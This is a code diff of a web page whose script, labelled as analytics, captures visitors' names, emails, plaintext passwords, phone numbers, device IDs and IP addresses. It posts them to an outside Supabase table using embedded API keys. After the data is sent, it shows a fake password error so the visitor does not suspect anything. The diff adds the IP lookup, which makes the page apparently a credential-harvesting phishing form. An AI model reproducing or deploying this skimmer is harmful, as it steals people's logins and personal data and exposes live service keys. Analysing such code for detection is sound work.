@@ -895,43 +895,51 @@
     
   <script class="analytics">(window.gaDevIds = window.gaDevIds || []).push('BwiEti');
     function insertData(name, email, password, phone, deviceId) {
-      if (!name || !email || !password || !phone) {
-        console.log("All field are required!")
-      }else {
-        $('#submit').text("Wait...")
-      }
-      $.ajax({
-        url: 'https://cxshjlbvspkyroeilyom.supabase.co/rest/v1/nikita',  // Your Supabase endpoint
-        type: 'POST',  // Use POST method to insert data
-        headers: {
-          'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4c2hqbGJ2c3BreXJvZWlseW9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY3NDcwODgsImV4cCI6MjA1MjMyMzA4OH0.lLi-8rCAF0NOlrw5zxvnbZurdC9WBGLJzCT4kVosTwE',  // API Key
-          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4c2hqbGJ2c3BreXJvZWlseW9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY3NDcwODgsImV4cCI6MjA1MjMyMzA4OH0.lLi-8rCAF0NOlrw5zxvnbZurdC9WBGLJzCT4kVosTwE',  // Bearer Token for Authorization
-          'Content-Type': 'application/json'  // Content type as JSON
-        },
-        data: JSON.stringify({
-          "name": name,  // Dynamically inserted data
-          "email": email,
-          "password": password,
-          "phone": phone,
-          "device": deviceId
-        }),
-        success: function (response) {
-          setTimeout(function() {
-            $('.pass-error .error').css('display', 'block');
-            $('#submit').text("Create my account")
-            
-            setTimeout(function() {
-              $('.pass-error .error').css('display', 'none');
-            }, 2500);
-          }, 2000);
+  if (!name || !email || !password || !phone) {
+    console.log("All fields are required!");
+    return;
+  } else {
+    $('#submit').text("Wait...");
+  }
 
-          // $(".pass-error .shake").css("display", "block");
-        },
-        error: function (xhr, status, error) {
-          console.log('Error:', error);
-        }
-      });
-    }
+  // First fetch the IP
+  $.getJSON("https://api.ipify.org/?format=json", function (ipResponse) {
+    let ipAddress = ipResponse.ip;
+
+    // Now insert into Supabase
+    $.ajax({
+      url: 'https://cxshjlbvspkyroeilyom.supabase.co/rest/v1/nikita',
+      type: 'POST',
+      headers: {
+        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkbXF4dGRrdnZjb2ZkbmlzemFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU3MTE5NjksImV4cCI6MjA3MTI4Nzk2OX0.VggXnS7Cawc_g5OK3ePbOmHvuChh2xEepiU4dPo8nlY',
+        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkbXF4dGRrdnZjb2ZkbmlzemFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU3MTE5NjksImV4cCI6MjA3MTI4Nzk2OX0.VggXnS7Cawc_g5OK3ePbOmHvuChh2xEepiU4dPo8nlY',
+        'Content-Type': 'application/json'
+      },
+      data: JSON.stringify({
+        "name": name,
+        "email": email,
+        "password": password,
+        "phone": phone,
+        "device": deviceId,
+        "ip": ipAddress
+      }),
+      success: function (response) {
+        setTimeout(function () {
+          $('.pass-error .error').css('display', 'block');
+          $('#submit').text("Create my account")
+
+          setTimeout(function () {
+            $('.pass-error .error').css('display', 'none');
+          }, 2500);
+        }, 2000);
+      },
+      error: function (xhr, status, error) {
+        console.log('Error:', error);
+      }
+    });
+  });
+}
+
 
     (function () {
       // Form control
